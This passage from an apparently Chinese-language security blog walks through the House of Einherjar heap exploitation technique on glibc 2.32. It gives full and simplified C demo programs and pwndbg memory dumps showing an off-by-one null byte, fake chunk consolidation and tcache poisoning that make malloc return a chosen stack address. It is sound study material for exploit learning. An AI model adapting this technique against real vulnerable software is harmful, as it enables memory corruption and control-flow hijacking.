class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This modification to The House of Enherjar works with the tcache-option enabled on glibc-2.32.</span></span><br><span class="line"><span class="comment">	 * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().</span></span><br><span class="line"><span class="comment">	 * It has the additional requirement of a heap leak.</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,</span></span><br><span class="line"><span class="comment">	 * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.</span></span><br><span class="line"><span class="comment">	 * The following restriction for normal bins won't allow us to create chunks bigger than the memory</span></span><br><span class="line"><span class="comment">	 * allocated from the system in this arena:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */</span></span><br><span class="line"></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to House of Einherjar 2!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Tested on Ubuntu 20.10 64bit (glibc-2.32).\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates the house of einherjar attack by creating a chunk overlapping situation.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Next, we use tcache poisoning to hijack control flow.\n"</span></span><br><span class="line">		   <span class="string">"Because of https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,"</span></span><br><span class="line">		   <span class="string">"now tcache poisoning requires a heap leak.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// prepare the target,</span></span><br><span class="line">	<span class="comment">// due to https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,</span></span><br><span class="line">	<span class="comment">// it must be properly aligned.</span></span><br><span class="line">	<span class="keyword">intptr_t</span> stack_var[<span class="number">0x10</span>];</span><br><span class="line">	<span class="keyword">intptr_t</span> *target = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// choose a properly aligned target address</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span>(((<span class="keyword">long</span>)&amp;stack_var[i] &amp; <span class="number">0xf</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			target = &amp;stack_var[i];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	assert(target != <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nThe address we want malloc() to return is %p.\n"</span>, (<span class="keyword">char</span> *)target);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nWe allocate 0x38 bytes for 'a' and use it to create a fake chunk\n"</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create a fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n"</span>);</span><br><span class="line"></span><br><span class="line">	a[<span class="number">0</span>] = <span class="number">0</span>;	<span class="comment">// prev_size (Not Used)</span></span><br><span class="line">	a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">	a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">	a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Our fake chunk at %p looks like:\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"prev_size (not used): %#lx\n"</span>, a[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"size: %#lx\n"</span>, a[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"fwd: %#lx\n"</span>, a[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"bck: %#lx\n"</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nWe allocate 0x28 bytes for 'b'.\n"</span></span><br><span class="line">		   <span class="string">"This chunk will be used to overflow 'b' with a single null byte into the metadata of 'c'\n"</span></span><br><span class="line">		   <span class="string">"After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n"</span>);</span><br><span class="line">	<span class="keyword">uint8_t</span> *b = (<span class="keyword">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Since we want to overflow 'b', we need the 'real' size of 'b' after rounding: %#x\n"</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">	 * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nWe allocate 0xf8 bytes for 'c'.\n"</span>);</span><br><span class="line">	<span class="keyword">uint8_t</span> *c = (<span class="keyword">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"c: %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* c_size_ptr = (<span class="keyword">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">	<span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nc.size: %#lx\n"</span>, *c_size_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"c.size is: (0x100) | prev_inuse = 0x101\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We overflow 'b' with a single null byte into the metadata of 'c'\n"</span>);</span><br><span class="line">	<span class="comment">// VULNERABILITY</span></span><br><span class="line">	b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// VULNERABILITY</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"c.size: %#lx\n"</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"It is easier if b.size is a multiple of 0x100 so you "</span></span><br><span class="line">		   <span class="string">"don't change the size of b, only its prev_inuse bit\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nWe write a fake prev_size to the last %lu bytes of 'b' so that "</span></span><br><span class="line">		   <span class="string">"it will consolidate with our fake chunk\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">	<span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>) - (<span class="keyword">uint8_t</span>*) a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Our fake prev_size will be %p - %p = %#lx\n"</span>, c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">	*(<span class="keyword">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Change the fake chunk's size to reflect c's new prev_size</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nMake sure that our fake chunk's size is equal to c's new prev_size.\n"</span>);</span><br><span class="line">	a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Our fake chunk size is now %#lx (b.size + fake_prev_size)\n"</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now we fill the tcache before we free chunk 'c' to consolidate with our fake chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nFill tcache.\n"</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++) &#123;</span><br><span class="line">		x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fill up tcache list.\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(x[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we free 'c' and this will consolidate with our fake chunk since 'c' prev_inuse is not set\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Our fake chunk size is now %#lx (c.size + fake_prev_size)\n"</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nNow we can call malloc() and it will begin in our fake chunk\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">intptr_t</span> *d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Next malloc(0x158) is at %p\n"</span>, d);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// tcache poisoning</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"</span></span><br><span class="line">		   <span class="string">"We have to create and free one more chunk for padding before fd pointer hijacking.\n"</span>);</span><br><span class="line">	<span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	<span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nNow we free chunk 'b' to launch a tcache poisoning attack\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p -&gt; %p ].\n"</span>, b, pad);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We overwrite b's fwd pointer using chunk 'd'\n"</span>);</span><br><span class="line">	<span class="comment">// requires a heap leak because it assumes the address of d is known.</span></span><br><span class="line">	<span class="comment">// since house of einherjar also requires a heap leak, we can simply just use it here.</span></span><br><span class="line">	d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="keyword">long</span>)target ^ ((<span class="keyword">long</span>)&amp;d[<span class="number">0x30</span>/<span class="number">8</span>] &gt;&gt; <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// take target out</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we can cash out the target chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nThe new chunk is at %p\n"</span>, e);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	assert(e == target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Got control on target/stack!\n\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简化版本：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> *x[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">size_t</span> <span class="built_in">stack</span>[<span class="number">16</span>],i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> ((<span class="keyword">long</span>)&amp;<span class="built_in">stack</span>[i]&amp;<span class="number">0xf</span>) i++;</span><br><span class="line">	<span class="keyword">size_t</span> *target = &amp;<span class="built_in">stack</span>[i];</span><br><span class="line">	<span class="keyword">size_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	a[<span class="number">0</span>] = <span class="number">0</span>;	<span class="comment">// prev_size (Not Used)</span></span><br><span class="line">	a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">	a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// prepare fwd == bck for unlink</span></span><br><span class="line">	a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">//</span></span><br><span class="line">	<span class="keyword">u_int8_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">	<span class="keyword">u_int8_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">	b[<span class="number">0x20</span>] = <span class="number">0x60</span>; <span class="comment">// set c prevsize</span></span><br><span class="line">	b[<span class="number">0x28</span>] = <span class="number">0</span>;    <span class="comment">// null byte of c size's least significant byte</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) x[i] = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(x[i]);</span><br><span class="line">	<span class="built_in">free</span>(c);  <span class="comment">// tcache is full so consolidate with our fake chunk then go into unsortbin</span></span><br><span class="line">	<span class="keyword">size_t</span> *d = <span class="built_in">malloc</span>(<span class="number">0x150</span>); <span class="comment">//cash out from unsortbin</span></span><br><span class="line">	<span class="keyword">void</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">// free one more chunk to bypass</span></span><br><span class="line">	<span class="built_in">free</span>(pad);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	d[<span class="number">0x30</span>/<span class="number">8</span>] = (<span class="keyword">long</span>)target ^ ((<span class="keyword">long</span>)&amp;d[<span class="number">0x30</span>/<span class="number">8</span>] &gt;&gt; <span class="number">12</span>); <span class="comment">//posion tcache  point to target</span></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x28</span>); <span class="comment">//cash out b</span></span><br><span class="line">	assert(<span class="built_in">malloc</span>(<span class="number">0x28</span>) == target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="pwndbg调试-10"><a href="#pwndbg调试-10" class="headerlink" title="pwndbg调试"></a>pwndbg调试</h3><p>和 poison_null_byte 类似，house_of_einherjar 也是通过一字节溢出来控制 malloc 申请到任意地址。<br>先申请了两个数组，x用于填充 tcache bin，stack 数组用于检查地址是否 0x10 字节对齐。具体源码可在我上一个 tcache_poisoning 中查看。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="comment">/* MALLOC_ALIGNMENT is the minimum alignment for malloc'ed chunks.  It</span></span><br><span class="line"><span class="comment">   must be a power of two at least 2 * SIZE_SZ, even on machines for</span></span><br><span class="line"><span class="comment">   which smaller alignments would suffice. It may be defined as larger</span></span><br><span class="line"><span class="comment">   than this though. Note however that code and data structures are</span></span><br><span class="line"><span class="comment">   optimized for the case of 8-byte alignment.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGNMENT (2 * SIZE_SZ &lt; __alignof__ (long double) \</span></span><br><span class="line">			  ? __alignof__ (<span class="keyword">long</span> <span class="keyword">double</span>) : <span class="number">2</span> * SIZE_SZ)</span><br><span class="line"></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): unaligned tcache chunk detected"</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为申请和释放的地址必须是0x10字节对齐的，如果要覆盖为我们任意的地址，那么这个任意地址也应该要对齐。检查到一个对齐的就可以break了。<br>0xf的二进制为1111，如果地址是0x10对齐，那么最后4位二进制位应该是0000。所以<code>&amp;0xf</code>就是取最后四位二进制位进行与运算，如果运算结果是0那么证明检测地址的最后4位二进制位应该是0000，即0x10对齐。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p/x &amp;stack</span><br><span class="line"><span class="meta">$</span>1 = 0x7fffffffd910</span><br></pre></td></tr></table></figure></p>
<p>第一个就可以作为target_addr。<br>申请一个0x30大小的 chunk 并在其内部构造一个 fake_chunk，并修改 fake_chunk 的fd指针与bk指针。注意这里绕过 unlink 检查的方法跟之前利用 unlink 漏洞时采用的方法不一样，利用 unlink 漏洞的时候：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = &amp;p-3*4</span><br><span class="line">p-&gt;bk = &amp;p-2*4</span><br></pre></td></tr></table></figure></p>
<p>在这里利用时，因为没有办法找到 &amp;p , 所以直接让：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = p</span><br><span class="line">p-&gt;bk = p</span><br></pre></td></tr></table></figure></p>
<p>修改效果：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p a</span><br><span class="line"><span class="meta">$</span>2 = (size_t *) 0x5555557572a0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x555555757290</span><br><span class="line">0x555555757290: 0x0000000000000000      0x0000000000000041</span><br><span class="line">0x5555557572a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> n</span><br><span class="line"><span class="meta">pwndbg&gt;</span> n</span><br><span class="line"><span class="meta">pwndbg&gt;</span> n</span><br><span class="line"><span class="meta">pwndbg&gt;</span> n</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x555555757290</span><br><span class="line">0x555555757290: 0x0000000000000000      0x0000000000000041</span><br><span class="line">0x5555557572a0: 0x0000000000000000      0x0000000000000060</span><br><span class="line">0x5555557572b0: 0x00005555557572a0      0x00005555557572a0</span><br><span class="line">0x5555557572c0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>再申请两个<code>u_int8_t*</code>类型的指针变量，<code>u_int8_t</code>类型的宽度是1字节，因为触发 unlink 只需要覆盖单字节。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p sizeof(u_int8_t)</span><br><span class="line"><span class="meta">$</span>1 = 1</span><br></pre></td></tr></table></figure></p>
<p>如果要触发合并物理相邻的前一个 chunk 的话，需要在free前把后面这个 chunk 的 prev_size 和 prev_inuse 位都修改掉。我们把 prev_size修改成 0x60，prev_inuse 由1修改成0。<br>修改效果：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p b</span><br><span class="line"><span class="meta">$</span>3 = (u_int8_t *) 0x5555557572e0 ""</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x5555557572d0</span><br><span class="line">0x5555557572d0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555557572e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757300: 0x0000000000000000      0x0000000000000101</span><br><span class="line"><span class="meta">pwndbg&gt;</span> n</span><br><span class="line"><span class="meta">pwndbg&gt;</span> n</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx 0x5555557572d0</span><br><span class="line">0x5555557572d0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555557572e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557572f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555757300: 0x0000000000000060      0x0000000000000100</span><br></pre></td></tr></table></figure></p>
<p>填充 tcache bin 后，free 掉 chunk_c，就会触发后向合并（consolidate backword）并存入 unsorted bin。再申请的话就是&amp;chunk_a-0x10。<br>为了申请到 target_addr，我们还需要利用 tcache bin 。接下来把 chunk_b 放进 tcache bin。这里有一点需要注意：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">	&amp;&amp; tcache</span><br><span class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		victim = tcache_get (tc_idx);</span><br><span class="line">		<span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
